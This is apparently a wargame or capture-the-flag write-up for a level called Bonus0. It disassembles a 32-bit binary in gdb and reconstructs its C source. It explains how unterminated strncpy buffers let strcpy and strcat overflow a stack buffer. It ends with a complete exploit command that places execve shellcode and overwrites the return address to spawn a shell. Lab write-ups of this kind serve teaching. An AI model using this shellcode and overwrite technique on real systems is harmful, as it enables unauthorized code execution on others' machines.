## Bonus0 - Stack Overflow
---

### Steps to solve
- #### Use gdb to get the assembly of functions and tracking instructions and discover memory values.
    - #### Get the used functions.
        ```c
        0x08048334  _init
        0x08048380  read
        0x08048390  strcat
        0x080483a0  strcpy
        0x080483b0  puts
        0x080483c0  __gmon_start__
        0x080483d0  strchr
        0x080483e0  __libc_start_main
        0x080483f0  strncpy
        0x08048400  _start
        0x08048430  __do_global_dtors_aux
        0x08048490  frame_dummy
        0x080484b4  p
        0x0804851e  pp
        0x080485a4  main
        0x080485d0  __libc_csu_init
        0x08048640  __libc_csu_fini
        0x08048642  __i686.get_pc_thunk.bx
        0x08048650  __do_global_ctors_aux
        0x0804867c  _fini
        ```
    - #### Assembly code of `main` function.
        ```c
        0x080485a4 <+0>:     push   %ebp
        0x080485a5 <+1>:     mov    %esp,%ebp
        0x080485a7 <+3>:     and    $0xfffffff0,%esp
        0x080485aa <+6>:     sub    $0x40,%esp
        0x080485ad <+9>:     lea    0x16(%esp),%eax
        0x080485b1 <+13>:    mov    %eax,(%esp)
        0x080485b4 <+16>:    call   0x804851e <pp>
        0x080485b9 <+21>:    lea    0x16(%esp),%eax
        0x080485bd <+25>:    mov    %eax,(%esp)
        0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
        0x080485c5 <+33>:    mov    $0x0,%eax
        0x080485ca <+38>:    leave  
        0x080485cb <+39>:    ret 
        ```
        #### Main call `pp` function and passes a buffer to it, then puts the buffer content. 
    - #### Assembly code of `pp` function
        ```c
        0x0804851e <+0>:     push   %ebp
        0x0804851f <+1>:     mov    %esp,%ebp
        0x08048521 <+3>:     push   %edi
        0x08048522 <+4>:     push   %ebx
        0x08048523 <+5>:     sub    $0x50,%esp
        0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp)
        0x0804852e <+16>:    lea    -0x30(%ebp),%eax
        0x08048531 <+19>:    mov    %eax,(%esp)
        0x08048534 <+22>:    call   0x80484b4 <p>
        0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)
        0x08048541 <+35>:    lea    -0x1c(%ebp),%eax
        0x08048544 <+38>:    mov    %eax,(%esp)
        0x08048547 <+41>:    call   0x80484b4 <p>
        0x0804854c <+46>:    lea    -0x30(%ebp),%eax
        0x0804854f <+49>:    mov    %eax,0x4(%esp)
        0x08048553 <+53>:    mov    0x8(%ebp),%eax
        0x08048556 <+56>:    mov    %eax,(%esp)
        0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
        0x0804855e <+64>:    mov    $0x80486a4,%ebx
        0x08048563 <+69>:    mov    0x8(%ebp),%eax
        0x08048566 <+72>:    movl   $0xffffffff,-0x3c(%ebp)
        0x0804856d <+79>:    mov    %eax,%edx
        0x0804856f <+81>:    mov    $0x0,%eax
        0x08048574 <+86>:    mov    -0x3c(%ebp),%ecx
        0x08048577 <+89>:    mov    %edx,%edi
        0x08048579 <+91>:    repnz scas %es:(%edi),%al
        0x0804857b <+93>:    mov    %ecx,%eax
        0x0804857d <+95>:    not    %eax
        0x0804857f <+97>:    sub    $0x1,%eax
        0x08048582 <+100>:   add    0x8(%ebp),%eax
        0x08048585 <+103>:   movzwl (%ebx),%edx
        0x08048588 <+106>:   mov    %dx,(%eax)
        0x0804858b <+109>:   lea    -0x1c(%ebp),%eax
        0x0804858e <+112>:   mov    %eax,0x4(%esp)
        0x08048592 <+116>:   mov    0x8(%ebp),%eax
        0x08048595 <+119>:   mov    %eax,(%esp)
        0x08048598 <+122>:   call   0x8048390 <strcat@plt>
        0x0804859d <+127>:   add    $0x50,%esp
        0x080485a0 <+130>:   pop    %ebx
        0x080485a1 <+131>:   pop    %edi
        0x080485a2 <+132>:   pop    %ebp
        0x080485a3 <+133>:   ret 
        ```
        #### Function `pp` calling `p` to times. First time with a variable `buffer1` and a string " - ".
        ```c
        0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)
        0x08048541 <+35>:    lea    -0x1c(%ebp),%eax
        0x08048544 <+38>:    mov    %eax,(%esp)
        0x08048547 <+41>:    call   0x80484b4 <p>
        ...
        (gdb) x/s 0x80486a0
        0x80486a0:       " - "
        ```
        #### Second time with an other variable `buffer2` and the same string " - ".
        ```c
        0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)
        0x08048541 <+35>:    lea    -0x1c(%ebp),%eax
        0x08048544 <+38>:    mov    %eax,(%esp)
        0x08048547 <+41>:    call   0x80484b4 <p>
        ```
        #### Then it call `strcpy` and passes to it the `main_buffer` the parameter that it take from main and the first variable `buffer1`.
        ```c
        0x0804854c <+46>:    lea    -0x30(%ebp),%eax
        0x0804854f <+49>:    mov    %eax,0x4(%esp)
        0x08048553 <+53>:    mov    0x8(%ebp),%eax
        0x08048556 <+56>:    mov    %eax,(%esp)
        0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
        ```
        #### Then it call `strcat` and passes to it the `main_buffer`  and the second variable `buffer2`.
        ```c
        0x0804858b <+109>:   lea    -0x1c(%ebp),%eax
        0x0804858e <+112>:   mov    %eax,0x4(%esp)
        0x08048592 <+116>:   mov    0x8(%ebp),%eax
        0x08048595 <+119>:   mov    %eax,(%esp)
        0x08048598 <+122>:   call   0x8048390 <strcat@plt>
        ```
    - #### Assembly code of `p` function
        ```c
        0x080484b4 <+0>:     push   %ebp
        0x080484b5 <+1>:     mov    %esp,%ebp
        0x080484b7 <+3>:     sub    $0x1018,%esp
        0x080484bd <+9>:     mov    0xc(%ebp),%eax
        0x080484c0 <+12>:    mov    %eax,(%esp)
        0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
        0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
        0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
        0x080484d6 <+34>:    mov    %eax,0x4(%esp)
        0x080484da <+38>:    movl   $0x0,(%esp)
        0x080484e1 <+45>:    call   0x8048380 <read@plt>
        0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
        0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
        0x080484f4 <+64>:    mov    %eax,(%esp)
        0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
        0x080484fc <+72>:    movb   $0x0,(%eax)
        0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
        0x08048505 <+81>:    movl   $0x14,0x8(%esp)
        0x0804850d <+89>:    mov    %eax,0x4(%esp)
        0x08048511 <+93>:    mov    0x8(%ebp),%eax
        0x08048514 <+96>:    mov    %eax,(%esp)
        0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
        0x0804851c <+104>:   leave  
        0x0804851d <+105>:   ret 
        ```
        #### Function `p` uses `puts` to print its second parameter, the string `" - "`, likely as a prompt.
        ```c
        0x080484bd <+9>:     mov    0xc(%ebp),%eax // ebp + 12 means second param.
        0x080484c0 <+12>:    mov    %eax,(%esp)
        0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
        ```
        #### Then it calls `read` with a local variable `buffer` and a size (`0x1000` in hex), which is 4096 in decimal.
        ```c
        0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
        0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
        0x080484d6 <+34>:    mov    %eax,0x4(%esp)
        0x080484da <+38>:    movl   $0x0,(%esp)
        0x080484e1 <+45>:    call   0x8048380 <read@plt>
        ```
        #### Next it call `strchr` to find the position of newline (`0xa` in hex, 10 in decimal). And replace it by `'\0'`.
        ```c
        0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
        0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
        0x080484f4 <+64>:    mov    %eax,(%esp)
        0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
        0x080484fc <+72>:    movb   $0x0,(%eax)
        ```  

        #### Then it call `strncpy` with the parameter that it take from `pp` as first param and the local variable `buffer` as second param, and a (`0x14` in hex) which is 20 in decimal.
        ```c
        0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
        0x08048505 <+81>:    movl   $0x14,0x8(%esp)
        0x0804850d <+89>:    mov    %eax,0x4(%esp)
        0x08048511 <+93>:    mov    0x8(%ebp),%eax
        0x08048514 <+96>:    mov    %eax,(%esp)
        0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
        ```
- #### Get the approximate source code.
    ```c
    #include<stdio.h>
    #include<stdlib.h>
    #include<string.h>


    void p(char *dest, char *prompt) {
        char buffer[4096]; // 0x1000 bytes
        puts(prompt);
        read(0, buffer, 4096);
        
        // Replaces the first newline character with a null terminator
        char *newline = strchr(buffer, '\n');
        if (newline) *newline = '\0'; 
    
        strncpy(dest, buffer, 20);
    }

    void pp(char *main_buffer) {
        char local1[20]; // at (%ebp)-0x30 (48 in decimal) -> room for 20 bytes
        char local2[20]; // at (%ebp)-0x1c (28 in decimal) -> room for 20 bytes
        
        p(local1, " - \n");
        p(local2, " - \n");
        
        strcpy(main_buffer, local1); 
        
        int len = strlen(main_buffer);
        short *end = (short*)(main_buffer + len);
        *end = ' '; 
        // (gdb) x/s 0x80486a4
        // 0x80486a4:       " "
        
        strcat(main_buffer, local2);
    }
    
    int main() {
        char main_buffer[34];
        pp(main_buffer);
        puts(main_buffer);
        return 0;
    }
    ```
    #### We can observe some useful things: the buffers of the `pp` function, `local1` and `local2`, are sequential.

    #### The `'\0'` is placed in the position of `'\n'`, so if there is no newline in the first `20` bytes, the `'\0'` will not be copied to `main_buff`.
    
    #### When appending `local2` to `main_buffer` with `strcat`, there is no size limitation used.
    
    #### Actually, there is no `win` function, but there is another way we can overwrite the return address as in previous levels and use a shellcode.

    #### To do this, we need to avoid having `'\0'` copied into `local1`. We can achieve this by passing more than `20` characters to `read`, so that the `'\0'` ends up somewhere after the first `20` bytes and is not copied into `local1`. Since `local1` and `local2` are laid out sequentially, the content of `local1` will be immediately followed by the content of `local2`.

    #### When the program comes to this line:
    ```c
    strcpy(main_buffer, local1);
    ```
    #### It will copy the content of both variables, `local1` and `local2`, into `main_buffer`. It will then continue copying some garbage until it finds a null terminator.

    #### After that adding `local2` as in this line of code bellow.
    ```c
    strcat(main_buffer, local2);
    ```
    #### So the `main_buffer` size will be more than `60` bytes and this is enough to overwrite the return address.

- #### Determine the number of bytes we need to overwrite the return address.
    #### Set a breakpoint before the program clears the stack to see the values' locations.
    ```c
    (gdb) b *0x080485c5
    Breakpoint 1 at 0x80485c5
    (gdb) r
    Starting program: /home/user/bonus0/bonus0 
    - 
    0123456789012345678    <- 19 characters
    - 
    01234567890123456789   <- 20 characters
    0123456789012345678 01234567890123456789���

    Breakpoint 1, 0x080485c5 in main ()
    ```
    #### After hitting the breakpoint, use gdb to see the values of the stack addresses.
    ```c
    (gdb) x/24wx $esp 
    0xbffff6f0:     0xbffff706      0x080498d8      0x00000001      0x0804835d
    0xbffff700:     0xb7fd13e4      0x31300016      0x35343332      0x39383736
    0xbffff710:     0x33323130      0x37363534      0x31302038      0x35343332
    0xbffff720:     0x39383736      0x33323130      0x37363534      0x0ff43938
    0xbffff730:     0x0800b7fd      0x00000000      0x00000000      0xb7e454d3
    0xbffff740:     0x00000001      0xbffff7d4      0xbffff7dc      0xb7fdc858
    (gdb) x/wx 0xb7e454d3
    0xb7e454d3 <__libc_start_main+243>:     0xe8240489
    ```
    #### This address, `0xb7e454d3`, is the return address. Let's calculate how far it is from `main_buffer`.
    ```c
    (gdb) x/s 0xbffff700+6
    0xbffff706:      "0123456789012345678 01234567890123456789\364", <incomplete sequence \375\267>
    (gdb) x/s 0xbffff706
    0xbffff706:      "0123456789012345678 01234567890123456789\364", <incomplete sequence \375\267>
    ```
    #### The address `0xbffff706` its the start of `main_buffer`, lets add some padding to know how mush between the `main_buffer` and the return address.
    ```c
    (gdb) x/s 0xbffff706+50
    0xbffff738:      ""
    (gdb) x/s 0xbffff706+54
    0xbffff73c:      "\323T\344\267\001"
    (gdb) x/wx 0xbffff706+54
    0xbffff73c:     0xb7e454d3
    ```
    #### The padding is `54`. Now we need to calculate where to place the address of the shellcode so that it matches this padding and overwrites the return address with the address of the shellcode.

    #### If we input more than `20` characters into `local1`, the `'\0'` will be placed after the first `20` bytes, so it will not be included. This means the two buffers, `local1` and `local2`, will behave like one continuous buffer. Let's try this.
    ```c
    (gdb) r
    Starting program: /home/user/bonus0/bonus0 
    - 
    01234567890123456789   <- 20 characters
    - 
    01234567890123456789   <- 20 characters
    0123456789012345678901234567890123456789��� 01234567890123456789���

    Breakpoint 1, 0x080485c5 in main ()
    ```
    #### As we expected, when the program copies `local1`, which comes before `local2`, it copies both of them. Let's see what happens in the stack.
    ```c
    (gdb) x/24wx $esp 
    0xbffff6f0:     0xbffff706      0x080498d8      0x00000001      0x0804835d
    0xbffff700:     0xb7fd13e4      0x31300016      0x35343332      0x39383736
    0xbffff710:     0x33323130      0x37363534      0x31303938      0x35343332
    0xbffff720:     0x39383736      0x33323130      0x37363534      0x0ff43938
    0xbffff730:     0x3020b7fd      0x34333231      0x38373635      0x32313039
    0xbffff740:     0x36353433      0xf4393837      0x00b7fd0f      0xb7fdc858
    (gdb)
    ```
    #### The return address has been overwritten successfully. We have `40` because `local1` and `local2` are merged, plus a garbage value that takes `4` bytes, as we saw above in gdb, and this garbage value is `b7fd0ff4` plus `1` byte for the newline delimiter. That's `45`. We need `9` more to reach the return address, which is `54` bytes from `main_buffer`.

    #### How will the solution work? We will locate the shellcode at the start of `local1`. The shellcode is `25` bytes, more than the size of `local1`, which is `20`, so the remaining bytes of the shellcode will be located at the start of `local2`. Since they are actually sequential, they will be copied into `main_buffer` as a single buffer in this line: `strcpy(main_buffer, local1);`, so the shellcode will end up in the same memory slots.
    
    #### In `local2`, we should place the address of the shellcode, which is the address of `main_buffer` (`0xbffff706`), and exactly after the `9` padding bytes we calculated above.




- #### Vulnrability Type: Stack Overflow.
- #### Solution command.
    ```sh
    (python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89"+"a"*4075+"\n"+"\xe1\xb0\x0b\xcd\x80BBBB"+"\x06\xf7\xff\xbf"+"a"*10)'; cat) | /home/user/bonus0/bonus0
    ```
    #### The shellcode represent the assembly code of `execv("/bin/dash");`
    #### `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`